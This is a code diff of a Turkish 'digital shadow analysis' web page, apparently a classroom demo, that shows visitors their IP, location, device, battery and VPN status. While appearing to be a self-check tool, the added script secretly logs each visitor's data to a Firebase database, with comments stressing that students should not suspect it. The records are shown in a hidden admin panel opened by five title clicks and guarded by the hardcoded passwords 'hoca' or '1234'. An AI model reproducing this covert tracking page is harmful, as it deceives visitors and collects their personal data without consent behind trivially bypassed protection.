@@ -5,6 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dijital Gölge Analizi</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <!-- Firebase SDK (Veritabanı için gerekli) -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    
     <style>
         :root {
             --matrix-green: #00ff41;
@@ -26,10 +30,8 @@
 
         #matrix-canvas {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             z-index: 0;
         }
 
@@ -40,11 +42,11 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.3);
         }
 
         .container {
-            max-width: 900px;
+            max-width: 1000px;
             width: 95%;
             margin: auto;
             padding: 60px 20px;
@@ -52,12 +54,11 @@
         }
 
         h1 {
-            font-size: clamp(24px, 6vw, 48px);
+            font-size: clamp(28px, 6vw, 48px);
             color: var(--neon-blue);
             text-shadow: 0 0 20px var(--neon-blue);
             margin-bottom: 30px;
-            letter-spacing: 2px;
-            cursor: default; /* Öğrenci şüphelenmesin */
+            cursor: pointer; /* Tıklanabilir olduğunu gizlemek için standart imleç de kalabilir */
             user-select: none;
         }
 
@@ -65,7 +66,6 @@
             font-size: 18px;
             line-height: 1.6;
             margin-bottom: 10px;
-            color: #fff;
             text-shadow: 2px 2px 10px #000;
         }
 
@@ -85,18 +85,15 @@
             transition: all 0.3s ease;
         }
 
-        .main-btn:hover:not(:disabled) {
+        .main-btn:hover {
             background: var(--matrix-green);
             color: black;
-            box-shadow: 0 0 40px var(--matrix-green);
             transform: scale(1.05);
         }
 
-        .main-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
         .qr-section {
             margin-top: 20px;
-            padding: 30px;
+            padding: 25px;
             background: rgba(255, 0, 255, 0.05);
             border: 1px solid var(--neon-pink);
             border-radius: 30px;
@@ -108,11 +105,11 @@
             background: white;
             padding: 10px;
             border-radius: 15px;
-            width: 180px;
-            height: 180px;
-            margin: 0 auto;
+            width: 160px; height: 160px;
+            display: block; margin: 0 auto;
         }
 
+        /* Analiz Paneli */
         .panel {
             display: none;
             margin-top: 50px;
@@ -127,7 +124,7 @@
 
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
             gap: 20px;
         }
 
@@ -140,7 +137,7 @@
             backdrop-filter: blur(5px);
         }
 
-        .title {
+        .title-card {
             color: var(--neon-blue);
             font-size: 11px;
             font-weight: bold;
@@ -148,46 +145,49 @@
             border-bottom: 1px solid rgba(0, 229, 255, 0.3);
         }
 
-        .value {
+        .value-card {
             font-family: 'JetBrains Mono', monospace;
             font-size: 13px;
-            color: #fff;
             word-break: break-all;
         }
 
-        /* --- GİZLİ ADMİN PANELİ STİLLERİ --- */
-        #admin-portal {
+        /* GİZLİ ADMİN PANELİ */
+        #admin-panel {
             display: none;
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 9999;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%; height: 80%;
+            background: #050505;
+            border: 3px solid var(--matrix-green);
+            z-index: 1000;
             padding: 20px;
             overflow-y: auto;
-            border: 4px solid var(--neon-pink);
+            box-shadow: 0 0 100px #000;
         }
 
-        .admin-header {
-            display: flex;
-            justify-content: space-between;
-            border-bottom: 2px solid var(--neon-pink);
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-
-        .log-entry {
-            background: #111;
-            border: 1px solid #333;
-            padding: 10px;
-            margin-bottom: 10px;
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: 'JetBrains Mono', monospace;
             font-size: 12px;
-            font-family: 'JetBrains Mono';
-            display: grid;
-            grid-template-columns: 1fr 1fr 2fr;
+            color: var(--matrix-green);
         }
 
-        .footer { margin-top: 80px; padding: 40px; text-align: center; }
-        .footer-quote { color: var(--matrix-green); font-style: italic; }
+        .admin-table th, .admin-table td {
+            border: 1px solid #222;
+            padding: 10px;
+            text-align: left;
+        }
+
+        .close-admin {
+            position: sticky; top: 0;
+            float: right;
+            background: red; color: white;
+            border: none; padding: 5px 15px; cursor: pointer;
+        }
+
+        .footer { padding: 40px; text-align: center; color: var(--matrix-green); }
     </style>
 </head>
 <body>
@@ -196,172 +196,220 @@
 
     <div class="content-layer">
         <div class="container">
-            <!-- BAŞLIĞA 5 KEZ TIKLAMAK ADMİN PANELİNİ AÇAR -->
-            <h1 id="secret-trigger">Dijital Gölgen Kimin Ellerinde?</h1>
+            <!-- Başlığa 5 Kez Tıklayınca Admin Paneli Açılır -->
+            <h1 id="main-title" onclick="handleSecretClick()">Dijital Gölgen Kimin Ellerinde?</h1>
             
-            <p class="intro-text">Dijital Gölge Analizine Hoş Geldin.</p>
             <p class="intro-text">Dijital ayak izinin ne kadar derin olduğunu keşfet.</p>
             
-            <button class="main-btn" id="analyze-btn" onclick="runAnalysis()">SİSTEMİ ANALİZ ET</button>
+            <button class="main-btn" onclick="runAnalysis()">SİSTEMİ ANALİZ ET</button>
 
             <div class="qr-section">
-                <h2 style="color: var(--neon-pink); margin-bottom: 10px;">📱 MOBİL ERİŞİM</h2>
                 <img id="qr-code" class="qr-image" src="" alt="QR">
-                <p style="margin-top: 15px; font-size: 12px; color: #aaa;">Hemen okut, telefondan devam et</p>
+                <p style="margin-top: 10px; font-size: 11px; color: var(--neon-pink);">MOBİL ERİŞİM</p>
             </div>
 
+            <!-- Kullanıcının Gördüğü Analiz Ekranı (Eski Tasarımın Aynısı) -->
             <div class="panel" id="panel">
-                <div class="grid" id="results-grid">
-                    <!-- Kartlar buraya gelecek -->
+                <div class="grid">
+                    <div class="card" style="border-color: var(--neon-pink);">
+                        <div class="title-card" style="color: var(--neon-pink);">BAĞLANTI GÜVENLİĞİ (VPN/PROXY)</div>
+                        <div class="value-card" id="vpn">Analiz Ediliyor...</div>
+                    </div>
+                    <div class="card">
+                        <div class="title-card">IP ADRESİ</div>
+                        <div class="value-card" id="ip">...</div>
+                    </div>
+                    <div class="card">
+                        <div class="title-card">KONUM / İSS</div>
+                        <div class="value-card" id="location">...</div>
+                    </div>
+                    <div class="card">
+                        <div class="title-card">CİHAZ ANALİZİ</div>
+                        <div class="value-card" id="device">...</div>
+                    </div>
+                    <div class="card">
+                        <div class="title-card">TARAYICI KİMLİĞİ</div>
+                        <div class="value-card" id="browser">...</div>
+                    </div>
+                    <div class="card">
+                        <div class="title-card">EKRAN ÇÖZÜNÜRLÜĞÜ</div>
+                        <div class="value-card" id="screen">...</div>
+                    </div>
+                    <div class="card">
+                        <div class="title-card">BATARYA DURUMU</div>
+                        <div class="value-card" id="battery">...</div>
+                    </div>
+                    <div class="card">
+                        <div class="title-card">BAĞLANTI TİPİ</div>
+                        <div class="value-card" id="speed">...</div>
+                    </div>
                 </div>
             </div>
         </div>
 
         <footer class="footer">
-            <p class="footer-quote">“Gerçek farkındalık, öğrendiğini kullanabildiğin anda başlar.”</p>
+            <p>“Gerçek farkındalık, öğrendiğini kullanabildiğin anda başlar.”</p>
         </footer>
     </div>
 
-    <!-- GİZLİ ADMİN PORTALI -->
-    <div id="admin-portal">
-        <div class="admin-header">
-            <h2 style="color: var(--neon-pink)">KAYITLI ANALİZLER (HOCA PANELİ)</h2>
-            <button onclick="document.getElementById('admin-portal').style.display='none'" style="background: red; color: white; border: none; padding: 5px 15px; cursor: pointer;">KAPAT</button>
-        </div>
-        <div id="admin-logs">
-            <p>Yükleniyor...</p>
-        </div>
+    <!-- GİZLİ YÖNETİCİ PANELİ (SADECE SİZE ÖZEL) -->
+    <div id="admin-panel">
+        <button class="close-admin" onclick="document.getElementById('admin-panel').style.display='none'">KAPAT</button>
+        <h2 style="color: var(--matrix-green); margin-bottom: 20px;">GİZLİ KAYITLAR</h2>
+        <table class="admin-table">
+            <thead>
+                <tr>
+                    <th>Tarih</th>
+                    <th>IP</th>
+                    <th>Konum</th>
+                    <th>Cihaz</th>
+                    <th>Pil</th>
+                    <th>VPN</th>
+                </tr>
+            </thead>
+            <tbody id="admin-data-list">
+                <tr><td colspan="6">Yükleniyor... (Firebase Ayarlarını Yapın)</td></tr>
+            </tbody>
+        </table>
     </div>
 
-    <script type="module">
-        // FIREBASE KURULUMU
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
-        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-firestore.js";
-
-        // BURASI ÖNEMLİ: Kendi Firebase bilgilerinizi buraya yapıştırın. 
-        // Eğer yoksa, kod hata vermeden çalışmaya devam eder ama kayıt yapmaz.
+    <script>
+        // --- FIREBASE AYARLARI ---
+        // Burayı Firebase Console'dan aldığın kendi bilgilerinle değiştir:
         const firebaseConfig = {
-            apiKey: "AIzaSy...", 
-            authDomain: "projeniz.firebaseapp.com",
-            projectId: "projeniz",
-            storageBucket: "projeniz.appspot.com",
-            messagingSenderId: "12345",
-            appId: "1:12345:web:abc"
+            apiKey: "SENIN_API_KEYIN",
+            authDomain: "PROJE_ADIN.firebaseapp.com",
+            projectId: "PROJE_ADIN",
+            storageBucket: "PROJE_ADIN.appspot.com",
+            messagingSenderId: "...",
+            appId: "..."
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const logCol = collection(db, "analiz_kayitlari");
+        // Firebase Başlatma (Hata almamak için kontrol ekliyoruz)
+        if (firebaseConfig.apiKey !== "SENIN_API_KEYIN") {
+            firebase.initializeApp(firebaseConfig);
+            var db = firebase.firestore();
+        }
 
-        // MATRIX EFEKTİ
+        // --- MATRIX ARKA PLAN ---
         const canvas = document.getElementById('matrix-canvas');
         const ctx = canvas.getContext('2d');
-        let width = canvas.width = window.innerWidth;
-        let height = canvas.height = window.innerHeight;
-        const chars = "010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿ";
+        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        window.addEventListener('resize', resize); resize();
+        const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZｱｲｳｴｵｶｷｸｹｺｻ";
         const fontSize = 18;
-        const columns = Math.floor(width / fontSize);
+        const columns = Math.floor(canvas.width / fontSize);
         const drops = Array(columns).fill(1);
-
-        function drawMatrix() {
+        function draw() {
             ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
-            ctx.fillRect(0, 0, width, height);
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = '#0f0';
             ctx.font = fontSize + 'px monospace';
             for (let i = 0; i < drops.length; i++) {
                 const text = chars.charAt(Math.floor(Math.random() * chars.length));
                 ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             }
         }
-        setInterval(drawMatrix, 40);
+        setInterval(draw, 40);
 
-        // QR KOD
+        // --- QR KOD ---
         window.onload = () => {
-            document.getElementById("qr-code").src = `https://quickchart.io/qr?text=${encodeURIComponent(window.location.href)}&size=200`;
+            const siteURL = window.location.href;
+            document.getElementById("qr-code").src = `https://quickchart.io/qr?text=${encodeURIComponent(siteURL)}&size=200`;
         };
 
-        // GİZLİ TETİKLEYİCİ (Başlığa 5 tıklama)
+        // --- GİZLİ TIKLAMA MANTIĞI ---
         let clickCount = 0;
-        document.getElementById('secret-trigger').onclick = () => {
+        function handleSecretClick() {
             clickCount++;
             if (clickCount >= 5) {
-                const pw = prompt("Sistem Şifresi:");
-                if (pw === "hoca" || pw === "1234") {
-                    document.getElementById('admin-portal').style.display = 'block';
-                    loadAdminLogs();
+                const pass = prompt("Sistem Şifresi:");
+                if (pass === "hoca" || pass === "1234") {
+                    document.getElementById('admin-panel').style.display = 'block';
+                    loadAdminData();
                 }
                 clickCount = 0;
             }
-        };
+            setTimeout(() => clickCount = 0, 3000); // 3 saniye içinde basılmazsa sıfırla
+        }
 
-        // ANALİZ VE VERİ KAYDI
-        window.runAnalysis = async function() {
-            const btn = document.getElementById("analyze-btn");
-            btn.innerText = "ANALİZ YAPILIYOR...";
-            btn.disabled = true;
-
-            try {
-                // Verileri Topla
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                
-                const stats = {
-                    ip: ipData.ip,
-                    location: `${ipData.city}, ${ipData.country_name}`,
-                    isp: ipData.org,
-                    device: `${navigator.platform} (${/Mobi/i.test(navigator.userAgent) ? 'Mobil' : 'PC'})`,
-                    browser: navigator.userAgent.split(' ').slice(-2).join(' '),
-                    screen: `${screen.width}x${screen.height}`,
-                    timestamp: serverTimestamp()
-                };
-
-                // UI Güncelle
-                showResultsUI(stats);
-                
-                // SESSİZCE KAYDET (Firebase)
-                await addDoc(logCol, stats);
-
-            } catch (err) {
-                console.log("Hata:", err);
-                alert("Bağlantı hatası! Lütfen tekrar deneyin.");
-                btn.disabled = false;
-                btn.innerText = "SİSTEMİ ANALİZ ET";
-            }
-        };
-
-        function showResultsUI(s) {
-            const grid = document.getElementById("results-grid");
-            grid.innerHTML = `
-                <div class="card"><div class="title">IP ADRESİ</div><div class="value">${s.ip}</div></div>
-                <div class="card"><div class="title">KONUM / İSS</div><div class="value">${s.location} / ${s.isp}</div></div>
-                <div class="card"><div class="title">CİHAZ ANALİZİ</div><div class="value">${s.device}</div></div>
-                <div class="card"><div class="title">EKRAN ÇÖZÜNÜRLÜĞÜ</div><div class="value">${s.screen}</div></div>
-            `;
+        // --- ANALİZ VE VERİ TOPLAMA ---
+        async function runAnalysis() {
             const panel = document.getElementById("panel");
             panel.style.display = "block";
             window.scrollTo({ top: panel.offsetTop - 50, behavior: 'smooth' });
-            document.getElementById("analyze-btn").innerText = "ANALİZ TAMAMLANDI";
+
+            let logData = {
+                timestamp: new Date().toLocaleString('tr-TR'),
+                ip: "Bilinmiyor",
+                location: "Bilinmiyor",
+                device: navigator.platform,
+                battery: "Erişilemiyor",
+                isVpn: "Analiz Edilemedi"
+            };
+
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                logData.ip = data.ip;
+                logData.location = `${data.city}, ${data.country_name}`;
+                
+                const org = (data.org || "").toLowerCase();
+                const isVpn = ["vpn", "proxy", "hosting", "cloud", "server"].some(k => org.includes(k));
+                logData.isVpn = isVpn ? "EVET" : "HAYIR";
+
+                // Ekrana Yazdır
+                document.getElementById("ip").innerText = data.ip;
+                document.getElementById("location").innerText = `${data.city}, ${data.country_name} (${data.org})`;
+                const vpnEl = document.getElementById("vpn");
+                vpnEl.innerText = isVpn ? "TESPİT EDİLDİ: Riskli Bağlantı" : "GÜVENLİ: Doğrudan Bağlantı";
+                vpnEl.style.color = isVpn ? "#ff00ff" : "#00ff41";
+            } catch (e) {
+                document.getElementById("ip").innerText = "Engellendi";
+            }
+
+            // Diğer Donanım Bilgileri
+            document.getElementById("device").innerText = `${navigator.platform} | ${/Mobi/i.test(navigator.userAgent) ? "Mobil" : "Masaüstü"}`;
+            document.getElementById("browser").innerText = navigator.userAgent.split(' ').slice(-2).join(' ');
+            document.getElementById("screen").innerText = `${screen.width}x${screen.height}`;
+            
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                logData.battery = `%${Math.round(batt.level * 100)}`;
+                document.getElementById("battery").innerText = `%${Math.round(batt.level * 100)} ${batt.charging ? "[Şarjda]" : ""}`;
+            }
+
+            if (navigator.connection) {
+                document.getElementById("speed").innerText = navigator.connection.effectiveType.toUpperCase();
+            }
+
+            // --- FIREBASE'E GİZLİCE KAYDET ---
+            if (typeof db !== 'undefined') {
+                db.collection("ziyaretciler").add(logData);
+            }
         }
 
-        // ADMİN KAYITLARINI ÇEK
-        function loadAdminLogs() {
-            const logsDiv = document.getElementById("admin-logs");
-            const q = query(logCol, orderBy("timestamp", "desc"));
-
-            onSnapshot(q, (snapshot) => {
-                logsDiv.innerHTML = "";
+        // --- ADMİN PANELİNE VERİ ÇEKME ---
+        function loadAdminData() {
+            if (typeof db === 'undefined') return;
+            db.collection("ziyaretciler").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+                const list = document.getElementById("admin-data-list");
+                list.innerHTML = "";
                 snapshot.forEach(doc => {
                     const d = doc.data();
-                    const row = document.createElement("div");
-                    row.className = "log-entry";
-                    row.innerHTML = `
-                        <div style="color:var(--matrix-green)">${d.ip}</div>
-                        <div style="color:var(--neon-blue)">${d.location}</div>
-                        <div style="color:#888">${d.isp} | ${d.device}</div>
+                    list.innerHTML += `
+                        <tr>
+                            <td>${d.timestamp}</td>
+                            <td>${d.ip}</td>
+                            <td>${d.location}</td>
+                            <td>${d.device}</td>
+                            <td>${d.battery}</td>
+                            <td>${d.isVpn}</td>
+                        </tr>
                     `;
-                    logsDiv.appendChild(row);
                 });
             });
         }
